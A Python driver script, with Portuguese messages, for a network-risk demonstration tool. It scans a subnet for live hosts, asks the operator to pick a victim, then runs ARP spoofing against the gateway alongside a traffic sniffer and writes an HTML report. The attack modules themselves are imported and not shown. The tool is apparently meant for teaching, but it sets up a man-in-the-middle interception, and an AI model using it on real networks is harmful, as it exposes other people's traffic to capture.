import sys
import threading
from varredura import executar_varredura, calcular_gateway
from arpspoof import habilitar_ip_forwarding, realizar_arp_spoofing
from sniffer import start_sniffer
from gerar_relatorio import gerar_relatorio_html
import time

def executar_etapa2_thread(hosts_ativos, gateway, interface):
    if not hosts_ativos:
        print("[ERRO] Nenhum host ativo foi encontrado na Etapa 1.")
        return

    print("\nHosts Ativos:")
    for i, (host, tempo) in enumerate(hosts_ativos, 1):
        print(f"{i}. IP: {host}, Tempo de Resposta: {tempo}ms")

    escolha = int(input("\nEscolha o número do IP do host para realizar o ARP Spoofing: "))
    alvo_ip = hosts_ativos[escolha - 1][0]

    print(f"\nIniciando ARP Spoofing para o alvo {alvo_ip}...")

    habilitar_ip_forwarding()

    stop_event = threading.Event()

    arpspoof_thread = threading.Thread(target=realizar_arp_spoofing, args=(alvo_ip, gateway, interface, stop_event))
    sniffer_thread = threading.Thread(target=start_sniffer, args=(interface, stop_event))

    arpspoof_thread.daemon = True
    sniffer_thread.daemon = True

    arpspoof_thread.start()
    sniffer_thread.start()

    try:
        arpspoof_thread.join()
        sniffer_thread.join()
    except KeyboardInterrupt:
        print("\nProcesso interrompido pelo usuário.")

def etapa3():
    print("[INFO] Monitoramento de tráfego iniciado automaticamente após ARP Spoofing.")

def menu():
    print("\n=== Ferramenta de Demonstração de Riscos em Redes Abertas ===")
    print("1. Descobrir Hosts Ativos (Etapa 1)")
    print("2. Realizar ARP Spoofing (Etapa 2)")
    print("3. Monitorar Tráfego de Rede (Etapa 3)")
    print("4. Sair")
    return input("Escolha uma opção: ")

def etapa1():
    rede = input("Digite a rede (ex.: 192.168.1.128/25): ")
    timeout = int(input("Digite o tempo limite de resposta (ms): "))
    
    hosts_ativos = executar_varredura(rede, timeout)
    print("\nHosts Ativos:")
    for host, tempo in hosts_ativos:
        print(f"IP: {host}, Tempo de Resposta: {tempo}ms")

    gateway = calcular_gateway(rede)
    interface = input("Digite a interface de rede (ex.: eth0): ")
    
    print("\nInformações salvas:")
    print(f"Gateway: {gateway}")
    print(f"Interface de Rede: {interface}")

    return hosts_ativos, gateway, interface

def etapa_final():
    gerar_relatorio_html()

if __name__ == "__main__":
    hosts_ativos = None
    gateway = None
    interface = None

    try:
        while True:
            escolha = menu()
            if escolha == "1":
                hosts_ativos, gateway, interface = etapa1()
            elif escolha == "2":
                if not hosts_ativos:
                    print("\n[ERRO] Execute a Etapa 1 antes de prosseguir.")
                else:
                    etapa2_thread = threading.Thread(target=executar_etapa2_thread, args=(hosts_ativos, gateway, interface))
                    etapa2_thread.start()
                    etapa2_thread.join()
            elif escolha == "3":
                etapa3()
            elif escolha == "4":
                etapa_final()
                sys.exit()
            else:
                print("Opção inválida.")
    except Exception as e:
        print(f"[ERRO] Ocorreu um erro: {e}")
